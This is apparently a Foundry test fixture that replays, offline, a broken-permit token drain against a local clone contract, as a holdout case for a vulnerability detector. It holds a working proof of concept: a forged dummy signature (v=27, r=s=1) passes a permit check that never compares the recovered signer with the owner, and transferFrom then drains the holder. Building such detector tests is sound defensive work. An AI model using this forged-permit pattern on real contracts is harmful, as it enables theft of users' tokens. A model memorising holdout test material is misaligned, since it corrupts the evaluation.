// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {LixirVaultTokenClone} from "../fixtures/permit-phishing/b-incident/LixirVaultTokenClone.sol";

/// @title permit-phishing (b) real-incident HOLDOUT fixture: Lixir broken permit (2026-06).
/// @notice Minimized OFFLINE replay of the documented broken-permit drain (no live RPC): the
///         vault token's `permit` accepted any dummy signature whose `ecrecover` was nonzero
///         (never checking recovered == owner), so an attacker forged a permit, obtained an
///         allowance, and `transferFrom`'d the holder's full balance. Real on-chain addresses
///         from the public post-mortem are used for fidelity (see PROVENANCE.md). The verdict is
///         derived from the real outcome (the balance left the holder), not hardcoded.
///
///         HOLDOUT: authored after the wal detectors froze at v0.1 and wal was NOT tuned to pass
///         it (label=vuln -> expect VULNERABLE).
contract LixirPermitIncidentTest is Test {
    // Public, documented addresses (Etherscan tx + verified code; public alert).
    address constant ATTACKER = 0x3Fa8cF7FeA68C8E76A9838d77889464DdFb6a6cf;
    // Representative holder (per-holder addresses are not in the public header).
    address constant HOLDER = address(0x1111);

    uint256 constant HOLDER_BALANCE = 24_182_560000000000000000; // ~24,182.56 LIX, representative

    function _report(string memory target, bool drained) internal pure {
        console.log(
            string.concat(
                "[permit-phishing] target=", target, " verdict=", drained ? "VULNERABLE" : "BLOCKED"
            )
        );
    }

    function test_lixirPermitIncident_isDrained() public {
        LixirVaultTokenClone token = new LixirVaultTokenClone();
        token.mint(HOLDER, HOLDER_BALANCE);

        uint256 balanceBefore = token.balanceOf(HOLDER);

        // Attack tx 0x17026fac...90a41da: a FORGED dummy signature. v=27 with r=s=1 recovers to
        // some nonzero address (NOT the holder) - which the broken permit wrongly accepts.
        uint8 v = 27;
        bytes32 r = bytes32(uint256(1));
        bytes32 s = bytes32(uint256(1));
        vm.prank(ATTACKER);
        token.permit(HOLDER, ATTACKER, balanceBefore, block.timestamp + 1 days, v, r, s);

        // The forged permit granted the attacker an allowance; now drain the holder.
        vm.prank(ATTACKER);
        token.transferFrom(HOLDER, ATTACKER, balanceBefore);

        uint256 finalBalance = token.balanceOf(HOLDER);
        bool drained = (balanceBefore > 0 && finalBalance == 0);
        _report("lixir-permit-victim", drained);

        assertTrue(drained, "incident replay should drain the holder via the forged permit");
        assertEq(finalBalance, 0, "holder should be emptied");
        assertEq(token.balanceOf(ATTACKER), HOLDER_BALANCE, "attacker should hold the drained balance");
    }
}
